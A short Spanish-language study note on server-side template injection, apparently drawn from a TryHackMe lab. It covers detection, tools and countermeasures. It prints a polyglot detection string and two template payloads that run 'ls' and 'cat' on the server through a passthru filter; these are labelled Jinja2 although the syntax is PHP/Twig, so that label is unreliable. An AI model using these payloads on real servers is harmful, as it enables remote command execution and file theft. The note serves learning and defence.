# Análisis de SSTI (Server-Side Template Injection)

## Descripción
El SSTI ocurre cuando las entradas de usuario se concatenan directamente en las plantillas de servidor sin una sanitización adecuada. Dependiendo del motor de plantillas (Jinja2, Twig, Mako, etc.), un atacante puede ejecutar código arbitrario en el servidor, leer archivos locales o acceder a variables de entorno sensibles.

## Clasificación
- **Fase**: Análisis de Vulnerabilidades
- **MITRE ATT&CK**: T1190 (Exploit Public-Facing Application)
- **Plataforma**: Web
- **Dificultad**: Intermedia

## Herramientas
- **Burp Suite** (Intruder) — para probar payloads de detección y exfiltración de forma sistemática.
- **Tplmap** — herramienta automatizada para detectar y explotar vulnerabilidades de SSTI.

## Comandos / Ejemplos

### Detección políglota
```bash
# Payload para detectar múltiples motores de plantillas
${{<%[%'"}}%
# Un resultado como 49 tras enviar {{7*7}} confirmaría Jinja2 o Twig
```

### Exfiltración de archivos en Jinja2 (Python)
```jinja2
# Listar archivos en un directorio usando passthru
{{['ls -la /var/www/html/flags',""]|sort('passthru')}}

# Leer contenido de un archivo específico
{{['cat /var/www/html/flags/secret.txt',""]|sort('passthru')}}
```

## Contramedidas
- Utilizar una política de "Logic-less templates" siempre que sea posible.
- Asegurar que el motor de plantillas se ejecute en un entorno restringido (sandboxing).
- Validar las entradas del usuario antes de pasarlas al motor de renderizado.

## Referencias
- Allen, M. (2022). *Mastering Kali Linux for Advanced Penetration Testing* (4th ed.). Packt Publishing.
- MITRE Corporation. (2024). ATT&CK Technique T1190: Exploit Public-Facing Application. https://attack.mitre.org/techniques/T1190/
- Notas del proyecto: notas-md/HNotes/HNotes/TryHackMe/Injectics.md
